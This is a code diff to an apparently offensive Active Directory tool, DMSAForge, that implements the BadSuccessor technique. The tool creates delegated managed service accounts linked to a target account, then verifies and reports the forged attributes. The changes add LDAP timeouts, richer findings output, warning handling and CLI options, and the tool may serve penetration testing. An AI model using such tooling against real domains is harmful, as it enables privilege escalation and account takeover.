@@ -73,6 +73,7 @@ IPV4_RE = re.compile(r'^\d{1,3}(?:\.\d{1,3}){3}$')
 IPV4_LIMITED_BROADCAST = '255.255.255.255'
 DEFAULT_VERIFY_ATTEMPTS = 3
 DEFAULT_VERIFY_DELAY = 2
+DEFAULT_LDAP_TIMEOUT = 30.0
 PROFILE_CHOICES = ('safe', 'report', 'ci')
 DMSA_EXPECTED_DELEGATED_STATE = '2'
 DMSA_DELEGATED_STATE_MEANINGS = {
@@ -273,32 +274,83 @@ class _LDAPEntry:
         raise AttributeError(item)
 
 
+class TemporarySocketDefaultTimeout:
+    def __init__(self, timeout):
+        self.timeout = timeout
+        self.previous = None
+
+    def __enter__(self):
+        if self.timeout is None:
+            return self
+        self.previous = socket.getdefaulttimeout()
+        socket.setdefaulttimeout(self.timeout)
+        return self
+
+    def __exit__(self, exc_type, exc, tb):
+        if self.timeout is not None:
+            socket.setdefaulttimeout(self.previous)
+
+
+def apply_socket_timeout(obj, timeout):
+    if obj is None or timeout is None:
+        return
+    candidates = [obj]
+    for name in (
+        'socket',
+        '_socket',
+        '_sock',
+        'sock',
+        '_Socket',
+        '_LDAPConnection__socket',
+        '_LDAPConnection__socketFile',
+        '_connection',
+        '_transport',
+    ):
+        try:
+            value = getattr(obj, name)
+        except Exception:
+            continue
+        if value is not None:
+            candidates.append(value)
+    for candidate in candidates:
+        setter = getattr(candidate, 'settimeout', None)
+        if callable(setter):
+            try:
+                setter(timeout)
+            except Exception:
+                pass
+
+
 class LDAPCompat:
     def __init__(self, domain, username, password, lmhash, nthash, aes_key, do_kerberos,
-                 target_host, dc_ip, base_dn, use_ldaps, kdc_host, port=None):
+                 target_host, dc_ip, base_dn, use_ldaps, kdc_host, port=None, timeout=DEFAULT_LDAP_TIMEOUT):
         self.entries = []
         self.result = None
         self.bound = False
+        self._timeout = timeout
 
         scheme = 'ldaps' if use_ldaps else 'ldap'
-        self._conn = impacket_ldap.LDAPConnection(
-            '%s://%s' % (scheme, target_host),
-            base_dn,
-            dstIp=dc_ip,
-            signing=not use_ldaps
-        )
+        with TemporarySocketDefaultTimeout(self._timeout):
+            self._conn = impacket_ldap.LDAPConnection(
+                '%s://%s' % (scheme, target_host),
+                base_dn,
+                dstIp=dc_ip,
+                signing=not use_ldaps
+            )
+            apply_socket_timeout(self._conn, self._timeout)
 
-        if do_kerberos:
-            self._conn.kerberosLogin(
-                username, password, domain, lmhash, nthash, aes_key,
-                kdcHost=kdc_host,
-                useCache=True
-            )
-        else:
-            self._conn.login(
-                username, password, domain, lmhash, nthash,
-                authenticationChoice='sasl'
-            )
+            if do_kerberos:
+                self._conn.kerberosLogin(
+                    username, password, domain, lmhash, nthash, aes_key,
+                    kdcHost=kdc_host,
+                    useCache=True
+                )
+            else:
+                self._conn.login(
+                    username, password, domain, lmhash, nthash,
+                    authenticationChoice='sasl'
+                )
+            apply_socket_timeout(self._conn, self._timeout)
 
         self.bound = True
         self.result = {'result': 0, 'description': 'success', 'message': ''}
@@ -348,13 +400,15 @@ class LDAPCompat:
     def search(self, search_base=None, search_filter='(objectClass=*)', search_scope=LDAP_SUBTREE,
                attributes=None, controls=None, **kwargs):
         try:
-            answers = self._conn.search(
-                searchBase=search_base,
-                scope=self._scope(search_scope),
-                searchFilter=search_filter,
-                attributes=attributes or [],
-                searchControls=self._controls(controls)
-            )
+            apply_socket_timeout(self._conn, self._timeout)
+            with TemporarySocketDefaultTimeout(self._timeout):
+                answers = self._conn.search(
+                    searchBase=search_base,
+                    scope=self._scope(search_scope),
+                    searchFilter=search_filter,
+                    attributes=attributes or [],
+                    searchControls=self._controls(controls)
+                )
             self.entries = self._entries_from_answers(answers)
             self._set_success()
             return True
@@ -442,32 +496,34 @@ class LDAPCompat:
 
     def add(self, dn, objectClass=None, attributes=None, controls=None):
         try:
+            apply_socket_timeout(self._conn, self._timeout)
             attrs = dict(attributes or {})
             object_classes = objectClass if objectClass is not None else attrs.pop('objectClass', [])
             if isinstance(object_classes, str):
                 object_classes = [object_classes]
 
-            # Newer Impacket builds have LDAPConnection.add(); Kali's packaged dev build may not.
-            if hasattr(self._conn, 'add'):
-                self._conn.add(dn, object_classes, attrs, controls=self._controls(controls))
-            else:
-                add_request = ldapasn1.AddRequest()
-                add_request['entry'] = dn
-                add_request['attributes'][0]['type'] = 'objectClass'
-                add_request['attributes'][0]['vals'].setComponents(*[self._ldap_value(v) for v in object_classes])
+            with TemporarySocketDefaultTimeout(self._timeout):
+                # Newer Impacket builds have LDAPConnection.add(); Kali's packaged dev build may not.
+                if hasattr(self._conn, 'add'):
+                    self._conn.add(dn, object_classes, attrs, controls=self._controls(controls))
+                else:
+                    add_request = ldapasn1.AddRequest()
+                    add_request['entry'] = dn
+                    add_request['attributes'][0]['type'] = 'objectClass'
+                    add_request['attributes'][0]['vals'].setComponents(*[self._ldap_value(v) for v in object_classes])
 
-                index = 1
-                for key, value in attrs.items():
-                    add_request['attributes'][index]['type'] = key
-                    if isinstance(value, (list, tuple)):
-                        vals = [self._ldap_value(v) for v in value]
-                    else:
-                        vals = [self._ldap_value(value)]
-                    add_request['attributes'][index]['vals'].setComponents(*vals)
-                    index += 1
+                    index = 1
+                    for key, value in attrs.items():
+                        add_request['attributes'][index]['type'] = key
+                        if isinstance(value, (list, tuple)):
+                            vals = [self._ldap_value(v) for v in value]
+                        else:
+                            vals = [self._ldap_value(value)]
+                        add_request['attributes'][index]['vals'].setComponents(*vals)
+                        index += 1
 
-                protocol_op = self._conn.sendReceive(add_request, self._controls(controls))[0]['protocolOp']
-                self._ldap_result_ok(protocol_op, 'addResponse', 'addRequest')
+                    protocol_op = self._conn.sendReceive(add_request, self._controls(controls))[0]['protocolOp']
+                    self._ldap_result_ok(protocol_op, 'addResponse', 'addRequest')
 
             self._set_success()
             return True
@@ -477,12 +533,14 @@ class LDAPCompat:
 
     def delete(self, dn, controls=None):
         try:
-            if hasattr(self._conn, 'delete'):
-                self._conn.delete(dn, controls=self._controls(controls))
-            else:
-                delete_request = ldapasn1.DelRequest(dn)
-                protocol_op = self._conn.sendReceive(delete_request, self._controls(controls))[0]['protocolOp']
-                self._ldap_result_ok(protocol_op, 'delResponse', 'deleteRequest')
+            apply_socket_timeout(self._conn, self._timeout)
+            with TemporarySocketDefaultTimeout(self._timeout):
+                if hasattr(self._conn, 'delete'):
+                    self._conn.delete(dn, controls=self._controls(controls))
+                else:
+                    delete_request = ldapasn1.DelRequest(dn)
+                    protocol_op = self._conn.sendReceive(delete_request, self._controls(controls))[0]['protocolOp']
+                    self._ldap_result_ok(protocol_op, 'delResponse', 'deleteRequest')
 
             self._set_success()
             return True
@@ -523,6 +581,7 @@ class DMSAForge:
         self._kdc_wait = options.kdc_wait
         self._verify_attempts = options.verify_attempts
         self._verify_delay = options.verify_delay
+        self._timeout = options.timeout
         self._allow_admin_fallback = options.allow_admin_fallback
         self._kerberos_guidance = options.kerberos_guidance
         self._operation_id = options.operation_id
@@ -670,7 +729,8 @@ class DMSAForge:
                     base_dn=self._base_dn,
                     use_ldaps=use_ldaps,
                     kdc_host=self._kdc_host,
-                    port=self._port
+                    port=self._port,
+                    timeout=self._timeout
                 )
                 if idx > 1:
                     self._record_inference('connection', 'selected', '%s/%d succeeded' % (method, port))
@@ -2115,6 +2175,13 @@ class DMSAForge:
     def _display_security_descriptor_summary_lines(self, sd_data):
         return self._security_descriptor_summary_lines(sd_data)
 
+    def _security_descriptor_contains_result(self, sd_data, expected_sid):
+        if not expected_sid:
+            return None
+        if sd_data in (None, b'', ''):
+            return False
+        return self._security_descriptor_contains_sid(sd_data, expected_sid)
+
     def verify_dmsa_creation(self, ldap_connection, dmsa_dn, expected_sam, expected_dns, expected_target_dn,
                              expected_allowed_sid=None, attempts=3, delay=2):
         """Read the newly created dMSA back from the DC and verify the attributes
@@ -2134,6 +2201,7 @@ class DMSAForge:
 
         last_errors = []
         self._last_verification_errors = []
+        self._last_verification_snapshot = {}
         for attempt in range(1, attempts + 1):
             success = ldap_connection.search(
                 search_base=dmsa_dn,
@@ -2149,6 +2217,18 @@ class DMSAForge:
                 state = self._entry_value(entry, 'msDS-DelegatedMSAState')
                 predecessor = self._entry_value(entry, 'msDS-ManagedAccountPrecededByLink')
                 membership = self._entry_value(entry, 'msDS-GroupMSAMembership')
+                membership_summary = self._display_security_descriptor_summary_lines(membership)
+                membership_contains_expected = self._security_descriptor_contains_result(membership, expected_allowed_sid)
+                self._last_verification_snapshot = {
+                    'dn': self._display_dn(entry.entry_dn),
+                    'sam': sam,
+                    'dns': dns,
+                    'state': state,
+                    'state_label': format_dmsa_delegated_state(state),
+                    'predecessor': self._display_dn(predecessor),
+                    'membership_summary': membership_summary,
+                    'membership_contains_expected_sid': membership_contains_expected,
+                }
 
                 errors = []
                 if str(sam).lower() != str(expected_sam).lower():
@@ -2168,7 +2248,7 @@ class DMSAForge:
                     _, _, sd_error = self._parse_security_descriptor(membership)
                     if sd_error:
                         errors.append('msDS-GroupMSAMembership is not a valid binary security descriptor: %s' % sd_error)
-                    elif expected_allowed_sid and not self._security_descriptor_contains_sid(membership, expected_allowed_sid):
+                    elif expected_allowed_sid and not membership_contains_expected:
                         errors.append('msDS-GroupMSAMembership does not contain principals-allowed SID %s' % expected_allowed_sid)
 
                 if not errors:
@@ -2349,15 +2429,27 @@ class DMSAForge:
             )
 
             log_section('Findings')
+            verification_snapshot = getattr(self, '_last_verification_snapshot', {}) or {}
+            membership_summary = verification_snapshot.get('membership_summary') or self._display_security_descriptor_summary_lines(group_msa_membership)
+            membership_status = membership_summary[0] if membership_summary else 'present'
+            if verified:
+                membership_status = '%s, verified' % membership_status
+            else:
+                membership_status = '%s, NOT VERIFIED' % membership_status
             log_kv("dMSA Name:", '%s$' % self._dmsa_name, width=30)
             log_kv("dMSA DN:", self._display_dn(dmsa_dn), width=30)
-            log_kv("DNS Hostname:", attributes.get('dNSHostName', 'Unknown'), width=30)
-            log_kv("Migration status:", format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')), width=30)
-            log_kv("Principals Allowed:", self._display_value(principals_allowed), width=30)
-            log_kv("Principals Allowed SID:", user_sid, width=30)
             log_kv("Target Account:", self._display_value(target_account), width=30)
-            log_kv("Target DN:", self._display_dn(target_dn), width=30)
-            log_kv("Group MSA Membership:", "verified" if verified else "NOT VERIFIED", width=30)
+            logging.info('BadSuccessor attributes:')
+            log_kv("  objectClass:", 'msDS-DelegatedManagedServiceAccount', width=35)
+            log_kv("  sAMAccountName:", verification_snapshot.get('sam') or attributes.get('sAMAccountName'), width=35)
+            log_kv("  dNSHostName:", verification_snapshot.get('dns') or attributes.get('dNSHostName', 'Unknown'), width=35)
+            log_kv("  msDS-DelegatedMSAState:", verification_snapshot.get('state_label') or format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')), width=35)
+            log_kv("  msDS-ManagedAccountPrecededByLink:", verification_snapshot.get('predecessor') or self._display_dn(target_dn), width=35)
+            log_kv("  msDS-GroupMSAMembership:", membership_status, width=35)
+            for line in membership_summary[1:]:
+                log_kv('', line, width=35)
+            log_kv("  reader SID:", user_sid, width=35)
+            log_kv("  nTSecurityDescriptor:", 'accepted in AddRequest' if add_mode == 'with nTSecurityDescriptor' else 'not accepted in AddRequest; object created without it', width=35)
             logging.info("LDAP Post-add Verification: %s" % ("SUCCESS" if verified else "FAILED"))
             if verified:
                 logging.info("KDC Readiness: NOT VERIFIED by this script")
@@ -2380,6 +2472,20 @@ class DMSAForge:
                 principals_allowed_sid=user_sid,
                 target_account=self._display_value(target_account),
                 target_dn=self._display_dn(target_dn),
+                badsuccessor_attributes={
+                    'objectClass': 'msDS-DelegatedManagedServiceAccount',
+                    'sAMAccountName': verification_snapshot.get('sam') or attributes.get('sAMAccountName'),
+                    'dNSHostName': verification_snapshot.get('dns') or attributes.get('dNSHostName', 'Unknown'),
+                    'msDS-DelegatedMSAState': verification_snapshot.get('state') or attributes.get('msDS-DelegatedMSAState'),
+                    'msDS-DelegatedMSAState_label': verification_snapshot.get('state_label') or format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')),
+                    'msDS-ManagedAccountPrecededByLink': verification_snapshot.get('predecessor') or self._display_dn(target_dn),
+                    'msDS-GroupMSAMembership': {
+                        'reader_sid': user_sid,
+                        'verified': bool(verified),
+                        'summary': membership_summary,
+                    },
+                    'nTSecurityDescriptor': 'accepted in AddRequest' if add_mode == 'with nTSecurityDescriptor' else 'not accepted in AddRequest; object created without it',
+                },
                 add_request='SUCCESS' if success else 'FAILED',
                 post_add_verification='SUCCESS' if verified else 'FAILED',
                 verification_errors=[] if verified else getattr(self, '_last_verification_errors', []),
@@ -2474,18 +2580,21 @@ class DMSAForge:
                     return False
 
             log_section('Findings')
-            log_kv('Verified DN:', self._display_dn(entry.entry_dn), width=30)
-            log_kv('Verified sAMAccountName:', sam, width=30)
-            log_kv('Verified DNS Hostname:', dns, width=30)
-            log_kv('Verified Target DN:', self._display_dn(predecessor), width=30)
-            log_kv('Verified MSA State:', format_dmsa_delegated_state(state), width=30)
+            log_kv('dMSA DN:', self._display_dn(entry.entry_dn), width=30)
+            logging.info('BadSuccessor attributes:')
+            log_kv('  objectClass:', 'msDS-DelegatedManagedServiceAccount', width=35)
+            log_kv('  sAMAccountName:', sam, width=35)
+            log_kv('  dNSHostName:', dns, width=35)
+            log_kv('  msDS-DelegatedMSAState:', format_dmsa_delegated_state(state), width=35)
+            log_kv('  msDS-ManagedAccountPrecededByLink:', self._display_dn(predecessor), width=35)
 
-            membership_lines = self._display_security_descriptor_summary_lines(membership)
-            log_kv('Verified MSA Membership:', membership_lines[0], width=30)
+            membership_lines = self._display_security_descriptor_summary_lines(membership) or ['missing']
+            log_kv('  msDS-GroupMSAMembership:', membership_lines[0], width=35)
             for line in membership_lines[1:]:
-                log_kv('', line, width=30)
+                log_kv('', line, width=35)
 
             errors = []
+            warnings = []
             if str(sam).lower() != ('%s$' % self._dmsa_name).lower():
                 errors.append('sAMAccountName does not match %s$' % self._dmsa_name)
             if str(state) != DMSA_EXPECTED_DELEGATED_STATE:
@@ -2498,8 +2607,13 @@ class DMSAForge:
                 _, _, sd_error = self._parse_security_descriptor(membership)
                 if sd_error:
                     errors.append('msDS-GroupMSAMembership is not a valid binary security descriptor: %s' % sd_error)
-                elif expected_sid and not self._security_descriptor_contains_sid(membership, expected_sid):
-                    errors.append('msDS-GroupMSAMembership does not contain principals-allowed SID %s' % expected_sid)
+                elif expected_sid:
+                    if self._security_descriptor_contains_sid(membership, expected_sid):
+                        log_kv('  expected reader SID:', '%s present' % expected_sid, width=35)
+                    else:
+                        message = 'expected reader SID %s is not present in msDS-GroupMSAMembership' % expected_sid
+                        warnings.append(message)
+                        log_kv('  expected reader SID:', '%s not present' % expected_sid, width=35)
 
             if errors:
                 logging.error('Verification FAILED: %s' % '; '.join(errors))
@@ -2508,10 +2622,14 @@ class DMSAForge:
                     dmsa_dn=self._display_dn(dmsa_dn),
                     verification='FAILED',
                     errors=errors,
+                    warnings=warnings,
                 )
                 return False
 
-            log_kv('Verification:', 'SUCCESS', width=30)
+            if warnings:
+                logging.warning('Verification warning: %s' % '; '.join(warnings))
+            verification_label = 'SUCCESS_WITH_WARNINGS' if warnings else 'SUCCESS'
+            log_kv('Verification:', verification_label, width=30)
             kerberos_guidance = self.print_rubeus_guidance() if self._kerberos_guidance else []
             self._set_report_result(
                 dmsa_name='%s$' % self._dmsa_name,
@@ -2521,7 +2639,23 @@ class DMSAForge:
                 target_dn=self._display_dn(predecessor),
                 msa_state=state,
                 msa_state_label=format_dmsa_delegated_state(state),
-                verification='SUCCESS',
+                membership_summary=membership_lines,
+                badsuccessor_attributes={
+                    'objectClass': 'msDS-DelegatedManagedServiceAccount',
+                    'sAMAccountName': sam,
+                    'dNSHostName': dns,
+                    'msDS-DelegatedMSAState': state,
+                    'msDS-DelegatedMSAState_label': format_dmsa_delegated_state(state),
+                    'msDS-ManagedAccountPrecededByLink': self._display_dn(predecessor),
+                    'msDS-GroupMSAMembership': {
+                        'expected_reader_sid': expected_sid or '',
+                        'expected_reader_sid_present': None if not expected_sid else not bool(warnings),
+                        'summary': membership_lines,
+                    },
+                },
+                expected_reader_sid=expected_sid or '',
+                warnings=warnings,
+                verification=verification_label,
                 kerberos_guidance=kerberos_guidance,
             )
             return True
@@ -2600,6 +2734,7 @@ CLI_DEFAULTS = {
     'skip_dc_prereq': False,
     'target_account': None,
     'target_ou': None,
+    'timeout': DEFAULT_LDAP_TIMEOUT,
     'ts': False,
     'update_source': DEFAULT_UPDATE_SOURCE,
     'verify_attempts': DEFAULT_VERIFY_ATTEMPTS,
@@ -2645,6 +2780,7 @@ OPTION_ALIASES = {
     'skip_dc_prereq': ('--skip-dc-prereq',),
     'target_account': ('--target-account', '-t'),
     'target_ou': ('--target-ou', '--ou', '-o'),
+    'timeout': ('--timeout',),
     'verify_attempts': ('--verify-attempts',),
     'verify_delay': ('--verify-delay',),
 }
@@ -2793,6 +2929,7 @@ def mark_supplied_options(options, argv):
         'dmsa_name',
         'dns_hostname',
         'target_account',
+        'timeout',
     ):
         setattr(options, '%s_supplied' % attr, option_supplied(argv, OPTION_ALIASES[attr]))
 
@@ -2850,6 +2987,16 @@ def non_negative_float(value):
         raise argparse.ArgumentTypeError('must be a number')
     if parsed < 0:
         raise argparse.ArgumentTypeError('must be 0 or greater')
+    return parsed
+
+
+def positive_float(value):
+    try:
+        parsed = float(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError('must be a number')
+    if parsed <= 0:
+        raise argparse.ArgumentTypeError('must be greater than 0')
     return parsed
 
 
@@ -3728,6 +3875,7 @@ def build_operation_report(options, mode, success=None, result=None):
             'skip_dc_prereq': options.skip_dc_prereq,
             'verify_attempts': options.verify_attempts,
             'verify_delay': options.verify_delay,
+            'timeout': options.timeout,
         },
         'parsed_inputs': {
             'base_dn_valid': validate_dn_syntax(base_dn) if base_dn else None,
@@ -3822,6 +3970,8 @@ def append_connection_options(parts, options):
         append_option(parts, '--method', options.method)
     if getattr(options, 'port_supplied', False) or (options.port is not None and options.method != 'LDAP'):
         append_option(parts, '--port', effective_port(options))
+    if getattr(options, 'timeout_supplied', False) or getattr(options, 'timeout', DEFAULT_LDAP_TIMEOUT) != DEFAULT_LDAP_TIMEOUT:
+        append_option(parts, '--timeout', options.timeout)
     if getattr(options, 'base_dn_supplied', False):
         append_option(parts, '--base-dn', options.base_dn)
     if getattr(options, 'scope_domain_supplied', False):
@@ -4065,7 +4215,7 @@ def build_next_steps(options, mode, success, result=None, report=None):
             return steps
 
     if options.action == 'add':
-        add('Verify the dMSA object', command_for_action('verify', step_options, kerberos_guidance=False))
+        add('Verify the dMSA object', command_for_action('verify', step_options, kerberos_guidance=False, principals_allowed=''))
         add('Delete the dMSA object when finished', command_for_action('delete', step_options, yes=True))
         if not options.kerberos_guidance:
             for command in kerberos_guidance_commands_for_options(step_options):
@@ -4333,7 +4483,7 @@ def add_common_local_options(parser, include_workflow=True, concise=False, workf
     local.add_argument('--output', action='store', metavar='FILE', help=hidden if concise else 'Write the operation report to FILE with mode 0600. With --output-only, FILE is JSON.')
     local.add_argument('--output-only', '--minimal-output', dest='output_only', action='store_true', help=hidden if concise else 'Emit only JSON to stdout, or JSON to --output with no stdout.')
     local.add_argument('--quiet', action='store_true', help=hidden if concise else 'Lower terminal output to warning/error only.')
-    local.add_argument('--no-banner', action='store_true', help='Suppress startup banner and attribution text.')
+    local.add_argument('--no-banner', action='store_true', help=hidden if concise else 'Suppress startup banner and attribution text.')
     if include_workflow:
         local.add_argument('--minimal', action='store_true', help=hidden if concise else 'Lightest workflow: no broad assessment analysis, name resolution, or extra Kerberos command output.')
         local.add_argument('--lean', dest='low_noise', action='store_true', help=hidden if concise else 'Enable lean local defaults.')
@@ -4352,6 +4502,7 @@ def add_connection_options(parser, include_auth=True, show_auth=True, concise=Fa
     ldap_group.add_argument('--port', '-p', type=int, choices=[389, 636], help='Destination port. LDAP defaults to 389, LDAPS to 636.')
     ldap_group.add_argument('--dc-host', dest='dc_host', action='store', metavar='HOSTNAME', help='Hostname of the domain controller.')
     ldap_group.add_argument('--dc-ip', dest='dc_ip', action='store', metavar='IP', help='IP of the domain controller.')
+    ldap_group.add_argument('--timeout', dest='timeout', action='store', type=positive_float, default=DEFAULT_LDAP_TIMEOUT, metavar='SECONDS', help=hidden if concise else 'LDAP socket timeout. Default: %(default)s seconds.')
 
     if include_auth:
         help_text = None if show_auth else argparse.SUPPRESS
@@ -4512,6 +4663,16 @@ def normalize_plan_shortcut(argv):
     if not option_supplied(planned, OPTION_ALIASES['dry_run']):
         planned.append('--dry-run')
     return planned
+
+
+def action_help_requested(argv):
+    if not argv or argv[0] not in VISIBLE_ACTION_CHOICES:
+        return False
+    tail = list(argv[1:])
+    if any(arg in ('-h', '--help') for arg in tail):
+        return True
+    non_display_args = [arg for arg in tail if arg != '--no-banner']
+    return len(non_display_args) == 0
 
 
 def validate_action_requirements(parser, options):
@@ -5471,10 +5632,9 @@ def _main(argv=None):
         parser = build_subcommand_parser()
         parser.error('unrecognized arguments: %s' % single_dash_long)
 
-    if argv and argv[0] in VISIBLE_ACTION_CHOICES:
-        if len(argv) == 1 or any(arg in ('-h', '--help') for arg in argv[1:]):
-            print_action_help(argv[0], no_banner='--no-banner' in argv[1:])
-            return 0
+    if action_help_requested(argv):
+        print_action_help(argv[0], no_banner='--no-banner' in argv[1:])
+        return 0
 
     if argv:
         if argv[0] in REMOVED_COMMANDS:
